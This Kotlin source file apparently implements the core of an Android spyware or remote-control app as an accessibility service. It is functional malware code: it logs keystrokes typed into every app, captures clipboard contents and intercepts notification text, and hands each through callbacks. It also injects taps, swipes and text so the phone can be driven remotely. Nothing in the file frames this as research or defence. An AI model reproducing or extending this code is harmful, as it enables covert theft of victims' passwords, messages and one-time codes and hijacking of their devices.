package com.template.app

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.GestureDescription
import android.content.ClipboardManager
import android.content.Context
import android.graphics.Path
import android.os.Build
import android.os.Bundle
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import androidx.annotation.RequiresApi

class MyAccessibilityService : AccessibilityService() {

    companion object {
        private const val TAG = "MyAccessibility"
        var instance: MyAccessibilityService? = null
    }

    // ==========================================
    // ===== KEYLOG STATE =====
    // ==========================================
    private val keylogBuffer = StringBuilder()
    private var lastPackage = ""
    private var lastClipboardText = ""

    // Callbacks
    var keylogCallback: ((String, String) -> Unit)? = null
    var clipboardCallback: ((String) -> Unit)? = null

    override fun onServiceConnected() {
        super.onServiceConnected()
        instance = this
        Log.d(TAG, "✅ Accessibility Service CONNECTED")
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return

        try {
            when (event.eventType) {
                // ===== NOTIFICATION INTERCEPT =====
                AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED -> {
                    val pkg = event.packageName?.toString() ?: ""
                    val title = event.text.joinToString(" ") { it.toString() }
                    val content = event.contentDescription?.toString() ?: ""

                    Log.d(TAG, "📩 Notif from $pkg: $title | $content")

                    NotificationInterceptor.onNotification(pkg, title, content)
                }

                // ===== KEYLOG: TEXT CHANGED =====
                AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                    val pkg = event.packageName?.toString() ?: ""
                    val text = event.text.joinToString("") { it.toString() }

                    // Kalau ganti app → flush buffer
                    if (pkg != lastPackage && keylogBuffer.isNotEmpty()) {
                        flushKeylog()
                    }
                    lastPackage = pkg

                    if (text.isNotEmpty()) {
                        keylogBuffer.append(text)
                        Log.d(TAG, "⌨️ [$pkg] Text: $text")

                        // Kirim kalau buffer > 100 char
                        if (keylogBuffer.length >= 100) {
                            flushKeylog()
                        }
                    }
                }

                // ===== CLIPBOARD: CHECK ON CLICK =====
                AccessibilityEvent.TYPE_VIEW_CLICKED,
                AccessibilityEvent.TYPE_VIEW_LONG_CLICKED,
                AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                    checkClipboard()
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "onAccessibilityEvent error", e)
        }
    }

    // ==========================================
    // ===== KEYLOG =====
    // ==========================================
    private fun flushKeylog() {
        if (keylogBuffer.isEmpty()) return

        val text = keylogBuffer.toString()
        val pkg = lastPackage

        keylogBuffer.clear()

        Log.d(TAG, "📤 Keylog flush [$pkg]: ${text.take(50)}")

        keylogCallback?.invoke(pkg, text)
    }

    // ==========================================
    // ===== CLIPBOARD =====
    // ==========================================
    private fun checkClipboard() {
        try {
            val clipboard = getSystemService(Context.CLIPBOARD_SERVICE)
                    as ClipboardManager

            if (clipboard.hasPrimaryClip()) {
                val clip = clipboard.primaryClip
                if (clip != null && clip.itemCount > 0) {
                    val text = clip.getItemAt(0).text?.toString() ?: ""
                    if (text.isNotEmpty() && text != lastClipboardText) {
                        lastClipboardText = text
                        Log.d(TAG, "📋 Clipboard: ${text.take(50)}")
                        clipboardCallback?.invoke(text)
                    }
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "clipboard error", e)
        }
    }

    override fun onInterrupt() {
        Log.d(TAG, "⚠️ Service interrupted")
    }

    override fun onDestroy() {
        super.onDestroy()
        flushKeylog()
        instance = null
        Log.d(TAG, "💀 Service destroyed")
    }

    // ==========================================
    // ===== GLOBAL ACTIONS =====
    // ==========================================
    fun performBack(): Boolean {
        return try {
            performGlobalAction(GLOBAL_ACTION_BACK)
        } catch (e: Exception) {
            false
        }
    }

    fun performHome(): Boolean {
        return try {
            performGlobalAction(GLOBAL_ACTION_HOME)
        } catch (e: Exception) {
            false
        }
    }

    fun performRecents(): Boolean {
        return try {
            performGlobalAction(GLOBAL_ACTION_RECENTS)
        } catch (e: Exception) {
            false
        }
    }

    fun performNotifications(): Boolean {
        return try {
            performGlobalAction(GLOBAL_ACTION_NOTIFICATIONS)
        } catch (e: Exception) {
            false
        }
    }

    fun performQuickSettings(): Boolean {
        return try {
            performGlobalAction(GLOBAL_ACTION_QUICK_SETTINGS)
        } catch (e: Exception) {
            false
        }
    }

    fun performPowerDialog(): Boolean {
        return try {
            performGlobalAction(GLOBAL_ACTION_POWER_DIALOG)
        } catch (e: Exception) {
            false
        }
    }

    // ==========================================
    // ===== TOUCH INJECTION (ANDROID 7+) =====
    // ==========================================
    @RequiresApi(Build.VERSION_CODES.N)
    fun performTap(x: Float, y: Float): Boolean {
        return try {
            val path = Path().apply { moveTo(x, y) }
            val gesture = GestureDescription.Builder()
                .addStroke(GestureDescription.StrokeDescription(path, 0, 50))
                .build()
            dispatchGesture(gesture, null, null)
        } catch (e: Exception) {
            Log.e(TAG, "Tap error", e)
            false
        }
    }

    @RequiresApi(Build.VERSION_CODES.N)
    fun performLongPress(x: Float, y: Float, durationMs: Long = 1000): Boolean {
        return try {
            val path = Path().apply { moveTo(x, y) }
            val gesture = GestureDescription.Builder()
                .addStroke(GestureDescription.StrokeDescription(path, 0, durationMs))
                .build()
            dispatchGesture(gesture, null, null)
        } catch (e: Exception) {
            Log.e(TAG, "LongPress error", e)
            false
        }
    }

    @RequiresApi(Build.VERSION_CODES.N)
    fun performSwipe(
        x1: Float, y1: Float,
        x2: Float, y2: Float,
        durationMs: Long = 300,
    ): Boolean {
        return try {
            val path = Path().apply {
                moveTo(x1, y1)
                lineTo(x2, y2)
            }
            val gesture = GestureDescription.Builder()
                .addStroke(GestureDescription.StrokeDescription(path, 0, durationMs))
                .build()
            dispatchGesture(gesture, null, null)
        } catch (e: Exception) {
            Log.e(TAG, "Swipe error", e)
            false
        }
    }

    @RequiresApi(Build.VERSION_CODES.N)
    fun performPinch(
        centerX: Float, centerY: Float,
        deltaX: Float, deltaY: Float,
        durationMs: Long = 300,
    ): Boolean {
        return try {
            val path1 = Path().apply {
                moveTo(centerX - deltaX, centerY - deltaY)
                lineTo(centerX - deltaX * 2, centerY - deltaY * 2)
            }
            val path2 = Path().apply {
                moveTo(centerX + deltaX, centerY + deltaY)
                lineTo(centerX + deltaX * 2, centerY + deltaY * 2)
            }
            val gesture = GestureDescription.Builder()
                .addStroke(GestureDescription.StrokeDescription(path1, 0, durationMs))
                .addStroke(GestureDescription.StrokeDescription(path2, 0, durationMs))
                .build()
            dispatchGesture(gesture, null, null)
        } catch (e: Exception) {
            false
        }
    }

    // ==========================================
    // ===== TEXT INPUT (FOCUSED NODE) =====
    // ==========================================
    @RequiresApi(Build.VERSION_CODES.LOLLIPOP)
    fun setTextOnFocusedNode(text: String): Boolean {
        return try {
            val root = rootInActiveWindow ?: return false
            val focused = root.findFocus(AccessibilityNodeInfo.FOCUS_INPUT)
                ?: return false

            val args = Bundle().apply {
                putString(
                    AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE,
                    text,
                )
            }

            focused.performAction(
                AccessibilityNodeInfo.ACTION_SET_TEXT,
                args,
            )
        } catch (e: Exception) {
            Log.e(TAG, "SetText error", e)
            false
        }
    }

    // ==========================================
    // ===== SCREEN INFO =====
    // ==========================================
    fun getScreenInfo(): Map<String, Any> {
        val metrics = resources.displayMetrics
        return mapOf(
            "width" to metrics.widthPixels,
            "height" to metrics.heightPixels,
            "density" to metrics.densityDpi,
        )
    }
}
